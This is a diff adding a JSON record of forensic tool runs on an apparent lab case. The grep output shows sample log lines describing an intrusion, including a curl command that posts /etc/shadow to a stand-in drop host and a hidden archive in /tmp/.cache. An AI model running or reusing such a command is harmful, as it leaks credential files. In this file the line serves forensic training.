@@ -1,0 +1,19 @@
+{
+  "case": "forensics02",
+  "generated_at": "2026-10-21T12:38:59Z",
+  "cwd": "Tool/cases/forensics02",
+  "runs": [
+    {
+      "cmd": "python ../../../Tool/scripts/forensics-check.py --file input/app.log --json",
+      "rc": 0,
+      "stdout": "{\r\n  \"ok\": true,\r\n  \"path\": \"D:\\\\Seep-Reverse-Lab\\\\Tool\\\\cases\\\\forensics02\\\\input\\\\app.log\",\r\n  \"type\": \"data\",\r\n  \"format\": \"unknown\",\r\n  \"confidence\": \"unverified\",\r\n  \"meta\": {},\r\n  \"timeline\": {\r\n    \"start_utc\": \"2026-10-21T12:38:03.034855Z\",\r\n    \"end_utc\": \"2026-10-21T12:38:03.034855Z\",\r\n    \"basis\": \"filesystem mtime only; content time requires acquisition record\",\r\n    \"timezone\": \"UTC display of local mtime\",\r\n    \"clock_skew\": \"unknown\",\r\n    \"precision\": \"filesystem dependent\"\r\n  },\r\n  \"extractables\": [\r\n    \"原件副本与 SHA256（封存）\",\r\n    \"采集记录：人/时间/工具/授权范围\",\r\n    \"统一 UTC 时间线（保留原时区与时钟偏差）\",\r\n    \"file/strings/entropy\",\r\n    \"文件 carve\",\r\n    \"哈希与来源说明\"\r\n  ],\r\n  \"integrity\": {\r\n    \"sha256\": \"e0b0d9362a970a025c849f7be82cfa1dbeb516b24a304bf6dc58cd49876d0923\",\r\n    \"size\": 619,\r\n    \"mtime_utc\": \"2026-10-21T12:38:03.034855Z\",\r\n    \"readonly\": false,\r\n    \"warnings\": [\r\n      \"文件可写：分析前应设为只读或使用副本\",\r\n      \"类型未确认：不要直接挂载/执行\"\r\n    ],\r\n    \"recommendation\": \"原件只读封存；在副本上分析；每次导出记录输入/输出哈希\"\r\n  },\r\n  \"conclusion\": \"类型未确认：先 file/strings/entropy，再决定是否进入内存/磁盘/包分析\"\r\n}\r\n",
+      "stderr": ""
+    },
+    {
+      "cmd": "grep -nE auth|outbound|exec|archive|dns input/app.log",
+      "rc": 0,
+      "stdout": "2:2026-10-20T04:55:31Z WARN  auth failed user=svc-backup src=198.51.100.23 attempt=5\n3:2026-10-20T04:57:02Z INFO  auth success user=svc-backup src=198.51.100.23\n4:2026-10-20T04:58:44Z WARN  outbound request url=https://drop.example.invalid/u/9f3a2c token=Bearer abc\n5:2026-10-20T05:01:19Z ERROR exec cmd=\"curl -s https://drop.example.invalid/u/9f3a2c -d @/etc/shadow\"\n6:2026-10-20T05:03:55Z DEBUG archive=/tmp/.cache/9f3a.tar.gz size=248192\n7:2026-10-20T05:06:10Z WARN  dns query=telemetry.suspicious.invalid type=A\n",
+      "stderr": ""
+    }
+  ]
+}
